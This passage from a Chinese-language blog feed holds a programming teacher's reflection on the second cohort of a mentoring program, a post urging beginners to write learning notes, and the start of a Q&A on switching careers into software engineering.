href="https://github.com/Lidemy/mentor-program-2nd/issues/22">學生心得：futianshen（轉職成功）</a></li></ol><h3 id="所以，你覺得第二期整體來說如何？"><a href="#所以，你覺得第二期整體來說如何？" class="headerlink" title="所以，你覺得第二期整體來說如何？"></a>所以，你覺得第二期整體來說如何？</h3><p>用一句話來總結：</p><blockquote><p><a href="/2018/11/04/mentor-program-2nd-mid-c7539f67b7d7/">這是一堂沒那麼適合初學者的課程</a>。</p></blockquote><p>如果你本來就有程式基礎，那些語法跟基本運算對你來說都不成問題，那你來這裡之後能夠成功轉職的機率很高，超級高。這邊教的東西都是對你有幫助的，而且我認為不只是找工作，在你開始工作後的第一年也都很有幫助。</p><p>從學生的表現看來，第二期最適合的其實是有點程式基礎，可能大學修了程式相關的課或是看了一些線上課程，但是對怎麼踏入職場還是很迷惘，不知道要學什麼的人。</p><p>來這邊以後有完整的課程大綱跟路線，只要跟著學就好，一路這樣練功練個四五個月，就可以出去求職並找到工作。</p><p>從這點來看，已經滿符合我對於這計畫的期許：</p><blockquote><p>不要再去尋找那些如何成為工程師的資源了，不要再去問人有沒有推薦的課程了，只要來這裡讓我帶著你，我就想辦法讓你變成工程師。</p></blockquote><p>但這還不夠，離我最想做的還差得遠呢。</p><p>我最想達成的目標是什麼？<a href="/2019/02/05/qa-be72946f0b23/">我在這裡寫過</a>：</p><blockquote><p>我想做的只是自我實現，想證明我很能教，證明我的教學比任何人都厲害。第一階段我想做到的是只要你願意付出時間，我就一定能教會你。例如說你真的能夠每週四十小時持續六個月，我就保證你一定能學成功，這是我想達到的目標。如果你學不成功，我不會說是你沒天份，我會說是我可以教得更好。</p></blockquote><p>從學生的心得就可以看出來，這個目標我還沒達到。</p><p>所以第二期失敗了嗎？不，也沒有，還是有一些學生找到工作，而且薪水也超乎我的預期，成效還不錯；那成功了嗎？當然沒有，轉職失敗的人比成功的多，怎麼會成功。</p><p>就像第一期的心得一樣，我不想談論成功或失敗，一件事情要百分之百的成功或失敗都是極其困難的，我想談的是我從第二期裡面學到了什麼。</p><p>我學到了：</p><ol><li>課程大綱的進步空間很大，主要是時程太緊</li><li>課程對初學者極度不友善，從四五週開始就卡到天荒地老</li><li>適合課程的是有程式基礎的人，順利跟完課程後很有機會找到工作</li><li>直播其實可有可無，改成預錄的導讀加上小單元的線上課程影片效果應該會更好</li><li>改作業對學生幫助很大</li><li>作業難度不一致，導致跟課困難</li></ol><p>綜合以上，就可以得出第三期改進的方向：</p><ol><li>時程拉長</li><li>調整作業難度</li><li>加上更多預錄的單元影片</li><li>加上導讀影片</li></ol><p>這個計畫每一期都比上一期變得更好，在第二期的時候我有做了點調整，但課綱大致上跟第一期差不多。但第三期跟第二期會有巨大的差別，因為學生的回饋變多了，所以我知道可以改進的地方也變多了。</p><p>第三期課綱會調整、作業會調整、時程也會調整，我會把它變成一堂更貼近初學者的課程。針對有基礎的人我也會希望提供一些額外教材或是挑戰題，讓他們不要覺得課程進度太慢很無聊。</p><p>說實在的，每次想到這些可以改進的地方我就很興奮，因為這些調整都會讓課程變得越來越好。這樣的優化是永無止盡的，永遠都有細節可以變得更好，可以不斷地、不斷地進步。</p><p>想到這些，就會讓我很期待改進後的結果以及成效。</p><h3 id="心得感想"><a href="#心得感想" class="headerlink" title="心得感想"></a>心得感想</h3><p>雖然說之前的課程心得文就已經寫過一次我自己的心得了，但又一兩個月過去了，也有了一些新的感想。</p><p>最近收了很多學生的心得回饋，很感謝這些學生願意給這些 feedback，而且有些寫的很長很詳細，對我來說幫助都很大。畢竟不是每個人都像我一樣這麼喜歡寫這種落落長的文章，而且也不習慣做這件事。</p><p>在上課的時候跟之後學生出去找工作那段時期，我自己的感覺是完全不一樣的。上課的時候就只負責回答問題跟改作業，事情比較多，他們會自己跑來找我問問題；但學生出去求職的時候狀況反過來了，換我會比較常跑去關心他們的近況，因為我超級好奇他們出去求職的結果。</p><p>他們的求職歷程對我來說是一個驗證自己課程價值的時候，雖然說我教得如何跟學生吸收多少以及到底學了多少本來就有一段差距，但不可否認的，這兩者關聯性是很大的。假設班上大家公認的一個認真上課，能力也很不錯的學生出去求職，結果面試了 30 間公司都找不到工作，每一間都說這樣的能力太差，那課程的問題顯然是比學生的問題要大的許多。</p><p>課程裡面教了許多我覺得重要的基礎，也補充了一些我覺得其他人應該很少補充的東西，因為我想讓他們看見更廣的世界，我導讀了 <a href="https://developers.google.com/web/updates/2018/09/inside-browser-part1">Inside look at modern browser</a>，不是為了讓他們完全理解文章在講什麼，而是希望他們至少有些概念，至少記得瀏覽器也是一塊很複雜的東西，而且做了許多優化。</p><p>我導讀了一系列資訊安全的相關文章，跟他們說儘管是 Facebook、Google 這些大公司，還是會出一些很基本的漏洞，所以寫程式時一定要把資訊安全的概念放在心中。也讓他們看了一些連我自己都看得不是很懂的資安文章，只希望讓他們有這層視野。</p><p>除了技術上的那些知識以外，我盡可能地把我日常在做的事、在看的文章都跟他們分享，Live coding 的時候可以看我怎麼寫 code，看我怎麼出糗然後 debug，這些對他們來說都是特別的體驗。他們想像中的工程師可能是一鼓作氣霹哩啪啦就把程式碼全部打出來，殊不知其實是寫一點錯一點，還跑去 Google 查資料，複製 stackoverflow 上的答案再修改一下。</p><p>如同我之前所說的，我希望他們不只是工程師，還能成為一個優秀的工程師。</p><p>從學生面試求職的歷程中我也學習到了很多，例如說課程中不足的地方，雖然強調資安但 code review 的時候漏掉，雖然跟他們說 coding style 很重要但沒有強迫規範，這些都是可以再改善的地方。我也用我自身的經歷告訴他們說面試沒過不要氣餒，每個公司要的人都不太一樣，就算拿到 offer 了可能待遇也差很多。</p><p>有公司開給我 28k，也有公司開給我 40k，也有公司覺得我不夠格，連二面都進不去。就算你技術能力很強，也不一定是公司想要找的人，求職就是這麼一回事。我希望第二期的學生們可以為之後樹立一個標竿，讓這期的其他同學或是以後的人知道一件事情：如果我能力鍛鍊到這個地步時，我是可以找到工作的，我的薪水是不會太差的。</p><p>聽著學生的面試經歷也很有趣，像是學生們出去面試時幾乎都會被問到跟這個計劃有關的問題，還有些面試官表示對這個計畫很有興趣，有種邊面試邊幫我宣傳課程的感覺。</p><p>之前我說過目標應該是一階段一階段的，可以由上而下也可以由下而上，目前我走的是由下而下路線，第一期證明你底子夠好的話可以跟完課找到工作，第二期又把難度調降一點點，知道大概是怎樣背景的人會比較有機會在結業時找到工作，第三期又會再把難度調低，希望能讓更沒有程式基礎的人也能順利結業並找到工作。</p><p>從去年九月到今年三月，半年的時光中經歷過三次教學調整，慢慢從學生的回饋中找到課程改善的方向，如今整個計畫結束，客觀來說成效普通甚至偏差，但留下了許多讓課程可以進化的資源。</p><p>第二期正式在這裡告一段落，感謝所有參加的學生、小幫手以及一直持續在關注這個計畫的每個人，還有我自己。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每一篇心得都有價值——為什麼初學者才更應該要寫心得筆記</title>
      <link href="/2019/02/07/why-blogging-ab77fd8c6ffa/"/>
      <url>/2019/02/07/why-blogging-ab77fd8c6ffa/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/why-blogging-ab77fd8c6ffa/0__4QR4TdySNRh58yJO.jpg"></p><p>91 哥寫過一篇文章叫做<a href="/2018/06/13/blog-e7a23a74ae2b/">《我為什麼鼓勵工程師寫 blog》</a>，跟大家談談我經營部落格的原因以及部落格成長的歷史。</p><p>呼籲工程師要來寫部落格的文章不少，但儘管如此，還是許多人遲遲沒有開始行動。前陣子的教學帶了一些學生，我也是不斷提醒他們寫部落格的好處並且建議他們有空的時候可以寫寫心得，但是會這樣做的人還是不多。</p><p>寫心得是需要練習的，就跟說話以及分手也是需要練習的一樣，你看我這樣批哩啪啦咻咻咻就完成一篇文章以為我天生神力，卻不知道我從<a href="https://medium.com/@hulitw/%E5%BB%A2%E6%96%87%E5%B7%A5%E4%BD%9C%E8%80%85%E7%9A%84%E9%A4%8A%E6%88%90-d05a5b7e539">小學二年級</a>就開始練習了。</p><p>身為一個老師十分需要學生的回饋，有了這些回饋才能幫助我改善課程。若是大家都不太敢寫也不太會寫心得，那我的進步空間就十分有限。有鑑於此，我決定來寫一篇文章跟大家說說寫心得的好處，以及為什麼初學者更應該寫心得（其實 91 哥那篇就寫得很棒了，強烈建議大家<a href="https://dotblogs.com.tw/hatelove/2017/03/26/why-engineers-should-keep-blogging">先看過那篇</a>）。</p><h3 id="寫心得的好處是什麼？"><a href="#寫心得的好處是什麼？" class="headerlink" title="寫心得的好處是什麼？"></a>寫心得的好處是什麼？</h3><p>直接開門見山跟大家講最大的一個好處：</p><blockquote><p><strong>幫助自己</strong></p></blockquote><p>對，不是為了流量、不是為了名聲，也不是為了可以放在履歷上博得好感，寫部落格最大的好處是可以幫助自己。</p><p>舉例來說，一些比較少用的技術你不可能時時刻刻都記著，你一定會忘記。忘記的時候怎麼辦？只好重新學一次囉，或是看能不能找回一點記憶，可以更快想起來。這時候如果你以前寫過心得，事情就變得容易多了，只要把自己以前的心得再看一次就好。</p><p>為什麼這樣就可以？</p><p>廢話，因為是你寫的啊。只要不要過太久，當時寫的內容你一定會記得一些，看到心得筆記的時候整個回憶都會被喚醒，用更快的時間幫助自己重新學習一次。</p><p>像是我忘記 Generator 時可以看 <a href="https://github.com/aszx87410/blog/issues/1">ES6 Generator 基礎</a>，忘記 iTerm2 的設定時可以看 <a href="http://huli.logdown.com/posts/402147-iterm2-zsh-better-environment">[心得] iTerm2 + zsh，打造更好的工作環境</a>，根本超級方便。</p><p>或者像是我前陣子教我學生一些部署相關的東西，他寫了一篇<a href="https://github.com/Lidemy/mentor-program-2nd-futianshen/issues/21">《一小時完成 VPS (Virtual Private Server) 部署》</a>，每次要處理相關的問題時就可以直接參考這篇而不是從頭開始重新查一次相關資料。</p><p>我先不跟你談什麼寫部落格可以幫助其他人，那都是之後的事了，先幫助到自己比較重要。</p><p>除了幫助未來的自己喚醒記憶以外，還有一個好處是能夠幫助自己重新整理知識。無論你文章寫得好或壞，光「寫」這件事情本身就是個把資訊消化以後重新輸出的過程。</p><p>先簡單總結一下，好處之一是幫助自己日後喚醒記憶，好處之二是幫助自己重新整理知識，總而言之，最大的目的就是幫助自己。</p><h3 id="破除妨礙你寫心得的迷思"><a href="#破除妨礙你寫心得的迷思" class="headerlink" title="破除妨礙你寫心得的迷思"></a>破除妨礙你寫心得的迷思</h3><p>寫心得筆記的好處或許大家都知道，但阻礙自己寫作的原因往往勝過於好處，所以大家才會不敢行動，接下來就讓我們來破除一下這些迷思。</p><h4 id="我怕我寫得不好，被別人看到很丟臉"><a href="#我怕我寫得不好，被別人看到很丟臉" class="headerlink" title="我怕我寫得不好，被別人看到很丟臉"></a>我怕我寫得不好，被別人看到很丟臉</h4><p>第一，你又沒有知名度，誰會來看你寫的筆記？不要在那邊假想觀眾了，你的部落格可能根本沒人看。</p><p>第二，就算真的有人看好了，那又怎麼樣？阿我就只是寫個心得筆記放在部落格，你也只是剛好路過看到而已，我寫得很爛又怎麼樣？又不是寫給你看的。</p><p>給大家看一下我部落格的第四篇文章的內容，標題是 <a href="http://huli.logdown.com/posts/189921-android-android-open-source-projects">[Android] 筆記集合</a></p><blockquote><p>Android Open Source Projects<br><a href="https://github.com/Trinea/android-open-project">https://github.com/Trinea/android-open-project</a><br>筆記一下 以後或許有機會用的到</p></blockquote><p>對，不要懷疑你的眼睛，就是這三行。可是又怎麼了？我本來就是寫筆記給自己看的又不是寫給其他人，我只是把它當作免費的 Evernote 在用而已。</p><p>所以呢，何必擔心其他人的眼光。</p><p>再退一步好了，如果你還是很擔心的話你就寫在一些私人筆記軟體上好了，這樣就沒話說了吧。</p><p>最後我要引一段 <a href="https://medium.com/u/218f8449085e">葉妮姍 Nissen Yeh</a> 在<a href="https://ithelp.ithome.com.tw/articles/10209415">《Day30：鐵人賽  — — 30 天可以給自己多大轉變？》</a>中寫的一段話來作為這個段落的總結：</p><blockquote><p>▌ 最好，是更好的敵人<br>剛開始覺得好焦慮啊。<br>因為學期真的太忙了，平時已經有 23 學分＋工讀，還要一次寫兩個挑戰，還要抽時間去運動<br>今天寫完，明天就來了，覺得時間根本不夠自己把文章寫到讓人看懂，而且都不夠有深度，讓人覺得很不專業。<br>但是回想自己的初心，我不過只是<code>想逼自己每週多學一點東西</code>而已<br><strong>我本來就是初學者，我為什麼要害怕讓別人知道我不夠強呢 XD？</strong><br>如果有力氣，那就把學習心得整理的讓人看得懂；如果力不從心，就老老實實認真記錄自己的進度就好，不用在意他人是否能夠閱讀。<br>我最喜歡的計算機科學家吳軍說過  — — ：<strong>「</strong><code>**最好，是更好的敵人**</code><strong>」</strong><br>進步總是一點點日積月累的，很少是一步到位。<br>一開始就完美主義，只會導致自己裹足不前。<br>只要從現代開始慢慢變強，相信總有一天，我也能成長成得以寫出有深度內容的人。</p></blockquote><h4 id="我怕寫的東西別人已經寫過了，跟別人觀點差不多"><a href="#我怕寫的東西別人已經寫過了，跟別人觀點差不多" class="headerlink" title="我怕寫的東西別人已經寫過了，跟別人觀點差不多"></a>我怕寫的東西別人已經寫過了，跟別人觀點差不多</h4><p>前面我有講過，寫文章最大的好處是幫助自己。</p><p>既然是幫助自己，那何必擔心寫的東西跟別人差不多？在學習的初期基本上都是從模仿開始，而且文章的靈感或是內容可能都是某本書或是某堂課程所帶給你的，所以寫出來的東西跟別人的差不多是很正常的一件事。</p><p>尤其是很多文章其實都是「看完某個教學之後的心得筆記」，既然是筆記，就代表是用自己的話、自己的理解把課程內容再闡述一遍，所以所有跟你看同一個教學的人寫出來的東西都差不多（例如說 JavaScript: Understanding the Weird Parts 的筆記文）。如果是教學文，重複也很正常，因為一般的流程就是介紹、安裝、帶著實作等等。</p><p>如果你有獨特的觀點那當然很好，但沒有也沒關係。要想想自己寫文章的目標是什麼？是為了成一家之言，擁有自己獨特的觀點，分享給別人之後可以得到讚賞嗎？還是為了幫自己消化吸收而來的知識，重新整理之後再輸出？</p><p>如果只是幫助自己重新複習學到的知識，那何必擔心跟別人的內容類似？</p><h4 id="我不知道要寫什麼"><a href="#我不知道要寫什麼" class="headerlink" title="我不知道要寫什麼"></a>我不知道要寫什麼</h4><p>如果這是你唯一的問題，那恭喜你，你的問題很好解決。</p><p>不知道寫什麼的話，就從<strong>流水帳</strong>開始。你就當作日記在寫，寫一下自己今天做了什麼、學了什麼就行，或甚至只貼幾個當天看過的文章連結也行。</p><p>寫自己今天做了什麼應該沒什麼困難吧？沒有限制字數，你要寫長寫短都可以，但重點是你一定要寫些什麼。</p><p>舉例來說，我今天的心得筆記可能長這樣：</p><blockquote><p>看了跟 PWA 有關的一篇文章，覺得跟想像中不太一樣，把之前說要寫的文章寫完，明天準備發布。有了新的 idea 開始了一個新的主題，被朋友問了 JS 相關的問題</p></blockquote><p>看起來很沒重點而且沒什麼內容，廢話，因為這是日記啊。</p><p>誰說寫部落格不能當日記在寫？誰說心得筆記就一定要寫得很專業？誰說技術文章一定要寫的很有品質？</p><p>那些都是後話，都是你現在不用考慮的事情。初學者做事情要一步一步來，先求「有」再求好，你連「有」都沒有了要怎麼求好。</p><p>不知道寫什麼的話就從日記開始寫，簡單記錄一下自己今天做的事情或是想研究的東西，寫著寫著一定會有靈感，你就知道該寫什麼了。</p><p>為什麼一定會有靈感？</p><p>因為你一定會碰到問題，而且是會讓你想要記起來的問題。例如說今天寫程式碰到一個 bug 解超久，我相信你解開的時候會很想要寫一篇文章記錄，因為你不記起來的話下次碰到又要再花一堆時間。</p><p>或者是你解決了一個很難的 bug 覺得很有成就感，也會想要寫成文章記錄下來，算是幫自己留個紀念。</p><p>就算沒有靈感也沒關係，反正就當日記在寫就好。</p><p>解決了<strong>害怕寫得不好</strong>以及<strong>不知道寫什麼</strong>兩個問題以後，你大概就沒什麼藉口來逃避寫心得筆記這件事了。</p><p>最後再給你一顆定心丸，也就是我要談到標題所說的那句了。</p><h3 id="初學者才更應該要寫心得筆記"><a href="#初學者才更應該要寫心得筆記" class="headerlink" title="初學者才更應該要寫心得筆記"></a>初學者才更應該要寫心得筆記</h3><p>前幾天跟一個朋友聊天，他說覺得弱弱的心得文被厲害的人看到會有點丟臉，我回他說：</p><blockquote><p>弱弱的心得文才珍貴好不好，因為一堆人都抱持著這樣的心態，導致這種新手心得文變得稀少，物以稀為貴</p></blockquote><p>這不是什麼安慰的話或是心靈雞湯，我是真的這麼想的。</p><p>你今天不知道什麼是 Session，網路上有一堆教學文；你不知道什麼是 React，也能找到一輩子都看不完的資源。</p><p>可是假如你今天寫到迴圈的時候卡關，你大概只能找到迴圈的教學，而不是曾經卡在迴圈的人的心得。</p><p>為什麼？因為沒什麼人分享，大家在新手階段的時候都沒有培養起寫心得筆記的習慣，大多數人都是學一陣子甚至是工作之後才開始寫的，所以這期間就變成了一段空白格，你很難找到剛學程式的人的心得。</p><p>我很喜歡看程式新手的各種學習心得，例如說《<a href="https://devs.tw/post/168">Ruby on Rails 新手自學的各種血淚與經驗分享</a>》、<a href="https://www.ptt.cc/bbs/Soft_Job/M.1546698359.A.BAD.html">《從學習者角度探討跨領域線上自學時的心態議題：以 MOOCs 學習網頁前端設計為例》</a>以及<a href="https://www.ptt.cc/bbs/Soft_Job/M.1498164525.A.CF6.html">《[心得] 轉職工程師，自學程式失敗心得》</a>。</p><p>這些對我來說是很珍貴的心得，因為這些心得文告訴了我們程式新手最真實的感想。身為一個不斷想要試圖讓學程式這件事情變容易的人，這些是很珍貴的寶藏，因為這些心得都是我沒辦法辦到的事。</p><p>什麼意思？</p><p>我記得我一開始接觸 C 語言的時候，光是看語法就被嚇傻了，那些大括號跟分號讓我覺得程式語言好複雜。但是我現在看 C 語言的程式碼，可以很清楚地看到架構、看到一行行程式碼所代表的意思。對十年前的我來說，就算是 C 語言的 hello world 也是很困難的東西，可是對現在的我來說，我會覺得 hello world 很簡單，就算是 C 語言也很簡單。</p><p>我失去了站在初學者的角度去看事情的能力，而且這能力我沒辦法找回來，因為我已經不在那個階段了。你寫程式的那些陰影魔障，對我來說都不放在心上。</p><p>儘管我可以試圖去同理，試圖一行行去解釋雙層迴圈到底在做什麼，但我沒有辦法<strong>感同身受</strong>，因為我怎麼看雙層迴圈都覺得這很簡單，不就是那樣嗎。我可以認同雙層迴圈對新手很難，因為十年前的我也是那樣，但十年後我並不知道難在哪，我也忘記當初卡關的點是什麼了。</p><p>沒辦法感同身受，那我要怎麼教的更好？</p><p>靠你跟我說。</p><p>靠學生跟我說他們卡關卡在哪裡、哪個地方覺得不懂，是對整個語法都不懂，還是對概念也不懂？我拆成這樣之後會幫助你理解嗎？我用這種方式教學會幫助你理解嗎？</p><p>這就是為什麼我說初學者的心得對我來說很珍貴，因為你們才是那個最能感同身受的人，而不是我，現在不是我，以後也絕對不會是我。從心得裡面我可以看出你卡在哪裡，甚至可以看出你是得到了怎樣的幫助後才破關。</p><p>我在設計課綱的時候，是從我的角度出發，<strong>我覺得</strong>這個對新手來說 ok，<strong>我覺得</strong>這個作業應該不會太難。但真正要寫作業的是誰？是那些程式的初學者，難不難是由他們來認定的，而不是我。我能做的只有猜測還有盡可能地同理。</p><p>像是我之前的<a href="https://github.com/Lidemy/mentor-program-2nd">課綱</a>我以為還行，但學生實際上過之後才發現根本不行，進度趕火車，喔不，根本就趕高鐵，一大堆的人進度跟不上。就是因為有學生的心得與回饋，我才能知道程式初學者到底在想什麼以及卡在哪裡。</p><p>我從以前就一直認為教學這種事，程度差異越大就越難教，就像你讓一個二十年經驗的工程師教別人 if else 跟 for 迴圈，他大概只會覺得這那麼簡單有什麼好教的，不就寫個兩三次就上手了嗎。可是對初學者來說絕對不是那樣，絕對沒有那麼簡單。</p><p>所以教學這種事，程度相近會越好教，例如說剛領悟迴圈的學生去教還沒學會的，對學會的人來說他的知識是熱騰騰的，是剛從烤箱出爐沒多久的超級新鮮的知識，所以對迴圈的感受最深也最知道該從哪裡去突破。這樣子的教學我覺得會更有效益一點。</p><p>像我這種資深的去教初學者之所以困難，是因為我沒辦法感同身受，只能靠著經驗累積，不斷地去詢問學生卡在哪裡，再依據他們的回饋改善課程。</p><p>所以呢，就跟我開頭講的一樣，初學者的心得對我來說才是最寶貴的。為了要讓初學者們勇於寫心得我才寫了這篇文章，想告訴你們說：</p><blockquote><p>嘿，真的不用害怕，你就當寫日記就好，有靈感的時候再寫其他的就好。你的心得比你想像中的更有價值，我是認真的。</p></blockquote><h3 id="我決定來寫心得了，該如何開始？"><a href="#我決定來寫心得了，該如何開始？" class="headerlink" title="我決定來寫心得了，該如何開始？"></a>我決定來寫心得了，該如何開始？</h3><p>上面看了這麼多你可能有一點動心，磨刀霍霍向豬羊準備要開始來寫心得筆記了，可是要怎麼開始呢？</p><p>首先當然是找個平台嘛，找個方便好用的平台可以事半功倍。</p><p>我這邊直接推薦你一個冷門的地方，叫做 GitHub。咦，GitHub 並不冷門啊，一大堆人都在用。可是用 GitHub Issues 來寫部落格就比較冷門了，我自己也是近期才意識到這樣做的好處。</p><h4 id="優點"><a href="#優點" class="headerlink" title="優點"></a>優點</h4><ol><li>程式碼支援超完善，至少比 Medium 簡單多了</li><li>完整支援工程師必會的 markdown 語法</li><li>內建評論以及 emoji 表情系統，討論方便</li><li>有其他 issue reference 到的時候會自動有標示</li><li>介面超級簡潔</li></ol><h4 id="缺點"><a href="#缺點" class="headerlink" title="缺點"></a>缺點</h4><ol><li>SEO 不太好，沒辦法修改那些 og tag</li><li>承上，會導致比較難分享出去</li><li>可能不太適合非工程師的心得筆記</li><li>沒有草稿功能（這點要寫長篇的話的確不太方便）</li></ol><p>以我來說，我把像這篇這種偏軟文的文章放在 Medium，把比較硬的技術文章放在 <a href="https://github.com/aszx87410/blog">GitHub</a>，目前的體驗我都覺得滿不錯的，我兩個學生也有試著把心得筆記放在 GitHub，大家可以看看會是什麼樣子：<a href="https://github.com/Lidemy/mentor-program-2nd-futianshen/issues">futianshen</a>、<a href="https://github.com/enter3017sky/mentor-program-2nd-blog/issues">enter3017sky</a></p><p>以上講的其實都比較偏工程師，如果你不是工程師的話，可以考慮以 Medium 作為首選的平台，使用起來簡單容易，沒有太多餘的功能，可以讓你很專心的在寫作這件事情。</p><p>很多人在挑選平台這件事情上會花很久，這其實是阻礙你寫作的第一步。如果你不是什麼網紅或是作家，選對平台沒有那麼重要，因為你搬家的成本很低。</p><p>假設這個平台真的很不適合你，你應該寫個五六篇就會有感覺了，這期間你也累積不到什麼觀眾，可以無痛轉移到其他平台繼續寫作。所以不要再煩惱要選什麼平台了，先開始寫比較實在。GitHub 跟 Medium 選一個吧。</p><p>（更新：後來因為 GitHub Issues 的 SEO 實在太差，所以我換到 hexo 去了）</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>之前聽一個朋友說他修了一堂跟畫圖有關的課，老師建議大家每天畫一張圖然後拍照作紀錄，畫什麼都行，但一定要畫。有不少人參與這個活動，甚至也有不是修這堂課的人看到這個覺得很有趣所以一起加入。</p><p>這其實可以應用到寫心得筆記上面，每天寫一篇，寫什麼都可以。聽起來有點像是 <a href="https://ithelp.ithome.com.tw/ironman?sc=nav">iT 邦幫忙鐵人賽</a>，但沒有競爭、沒有名次也沒有獎金，應該也會比較沒有壓力，你就算 po 個三個字也行。</p><p>當下聽到這方法我覺得滿不錯的，其實就是培養習慣，每天寫一點點，累積了三十天後會發現其實也寫了不少東西。之後的教學計畫我會把這點也加在裡面，讓學生每天都試著 po 一篇心得，不管 po 什麼都可以。沒時間只是藉口，po 一篇文章五分鐘十分鐘怎麼會沒時間。</p><p>總之呢，誠心建議初學者們可以開始寫心得筆記，先從寫日記開始，簡單記錄自己學了什麼就行，就算不完整就算寫得很爛也一樣照 po，不斷地寫不斷地寫才能進步。</p><p>每天成長一點，就能變得愈來愈好。</p>]]></content>
      
      
      <categories>
          
          <category> 寫作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寫作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式相關問題一網打盡：談自學、轉職、出國、職涯、教學、補習、騙錢、產業以及努力</title>
      <link href="/2019/02/06/qa-be72946f0b23/"/>
      <url>/2019/02/06/qa-be72946f0b23/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/qa-be72946f0b23/0__7hPhhg2u1BbIbIvM.jpg"></p><p>從以前到現在被問了不少跟學程式相關的問題，對於頻率較高的題目我在閒暇之餘都會把我的回答寫成一篇文章，下次再有人問我的時候就能夠直接把文章貼給他，節省他的時間也節省我的。工程師嘛，提高可重用性是很重要的。</p><p>雖然回答了不少，但隨著年紀跟資歷的增長漸漸被問到一些新的問題，前陣子受邀到 <a href="https://tw.alphacamp.co/blog/2019-1-30-huli-bernard-engineer-career">ALPHAcamp</a> 與 Bernard 一起直播回答問題，收集了滿多新的疑問，是該找個時候來寫另一篇文章了。</p><p>標題涉獵的範圍很廣，因為我想用這一篇簡單回答幾乎所有的常見問題。有些可以再延伸出去的我應該都有寫過文章分享了，簡易回答以後會附上延伸閱讀的連結。</p><p>接下來的順序會是：</p><ol><li>轉職前相關問題（這樣的背景可以嗎、如何挑選補習班）</li><li>學程式相關問題（該學什麼、注意事項、如何成長）</li><li>職涯發展相關問題（選工作時的考量、怎樣算資深工程師、要往哪精進）</li><li>出國工作相關問題（新加坡與台灣的差異、英文能力、學歷或年齡限制）</li><li>產業相關問題（前端難民、現在適合轉職嗎、產業未來趨勢）</li><li>教學相關問題（為什麼做教學、後續的教學計畫）</li></ol><p>如果有漏掉什麼的歡迎在留言補充，我之後會再找時間補上。寫到這邊再次意識到這篇有夠難寫，儘管牽涉到的範圍已經很廣了，我依然可以想像得到有些問題會被遺漏。另外，這篇會附上一大堆我以前寫過的文章，認真把這篇還有相關文章看完的話會花一點時間，可以自己評估是否值得。</p><h3 id="轉職前相關問題"><a href="#轉職前相關問題" class="headerlink" title="轉職前相關問題"></a>轉職前相關問題</h3><h4 id="我目前的背景是-XXX（請自由帶入任意背景），請問這樣能夠轉職成功嗎？"><a href="#我目前的背景是-XXX（請自由帶入任意背景），請問這樣能夠轉職成功嗎？" class="headerlink" title="我目前的背景是 XXX（請自由帶入任意背景），請問這樣能夠轉職成功嗎？"></a>我目前的背景是 XXX（請自由帶入任意背景），請問這樣能夠轉職成功嗎？</h4><p>這是最常見的問題之一，背景可以填入任意字元，例如說 38 歲業務、20 歲輟學生、50 歲 PM 等等，每隔一陣子就會在 ptt 看到類似的文章。</p><p>直接開門見山回答你：<strong>我怎麼會知道？</strong></p><p>就算跟你有一樣背景的人轉職成功了，在邏輯上並不蘊含「你也會成功」，這是兩碼子事，唯一能確認的只有「這樣背景的人有人可以成功」；若是相同背景的人沒有人成功，也不代表「你不會成功」，只能代表「截止目前為止這樣背景的人沒有人可以成功」，但你有可能是第一個。</p><p>簡單來說就是別人成功不甘你的事，你成功也不甘別人的事。所以我不喜歡「別人可以，你一定也可以！」這種話，那個「一定」是怎麼推出來的可以告訴我嗎？別人可以，只代表「有人」可以，到底哪來的「一定可以」？</p><p>如果加上相信兩個字我就沒意見了，「他可以，我相信你也可以」，因為相信包含著主觀感受以及對你的信任，但是「一定」的背後要有強烈的理由支持你。引用我在<a href="/2018/11/04/mentor-program-2nd-mid-c7539f67b7d7/">《這是一堂沒那麼適合初學者的課程  — — 程式導師實驗計畫第二期期中反思》</a>寫的一段話：</p><blockquote><p>可能有人會覺得：「既然他可以，為什麼你不行？」，但光從這句話看起來，你仔細想想會發現滿沒有道理的，為什麼他可以你就要可以？從邏輯上看起來，他可以只代表「有人可以」，跟你可不可以一點關聯都沒有。</p></blockquote><blockquote><p>而且這句話基本上是忽略了個體之間的差異，有些人天生就有某些才能，可是有些人就要花更多更多的時間才能把這個差距給補足。他做得到，僅僅代表至少有人能做得到，但我做不做得到跟他一點關係都沒有，我唯一可以做的事情就是盡力去做。</p></blockquote><p>我能理解問這個問題的心態，大多數是想找到一點認同，或是在決定要轉職前幫自己設個心理預期或者是停損點。例如說相同背景的人還沒有人能夠轉職成功，可能就會考量自己是否要踏進來。可是從另一個角度想，這算是一種聰明的權衡還是畫地自限？</p><p>這樣說好了，這個問題本身的答案我覺得並不重要，而且很有可能也沒有答案。我只能告訴你以我看過的案例，這樣的背景可能比較有程式基礎，學起來比較容易，但學習是件長期的事情，靠的是你能付出的毅力以及是否真心喜愛寫程式。</p><p>重要的是當你知道這個答案之後，你打算做什麼？</p><p>我告訴你說目前沒看過這樣的人轉職成功，你就不轉了嗎？我告訴你說這樣的背景很多人都 ok，你就覺得自己也會變成他們嗎？</p><p>假設我今天問説：</p><blockquote><p>各位大大好，我現在 25 歲在新加坡工作，請問我可以學會騎腳踏車嗎？</p></blockquote><p>你的回答會是什麼？</p><blockquote><p>啊你就去試試看就知道啦</p></blockquote><p>對啊，啊你就去試試看就知道啦，學程式又不是一件你需要傾家蕩產或需要付個八萬十萬才能開始的事情。你隨便 Google 都可以找到一輩子學不完的資源，妨礙學程式的元兇永遠都只有你自己。</p><p>找些簡單的資源學個一兩個月，很快你就能夠得到解答。你寫程式的時候開心嗎？你喜歡嗎？這些都是實際下去學習以後會得到的答案，而且這答案只有你自己能給。</p><p>如果真心喜歡的話就繼續去試，真的不喜歡的話就不要勉強。</p><p>你都不試試看怎麼知道？學程式需要付出的成本並不多，我也沒有要你一路學到轉職，只要學個基礎確認一下自己有沒有興趣就好。</p><p>最後總結一下，我對這個問題的回答是：「我不知道你能不能轉職成功，但我建議你先用最低的成本去試試看，先試過你會有更多感想，到時候我們再來討論」</p><h4 id="我確定要學程式了，我應該要去補習班還是自學？要去的話該如何挑選？"><a href="#我確定要學程式了，我應該要去補習班還是自學？要去的話該如何挑選？" class="headerlink" 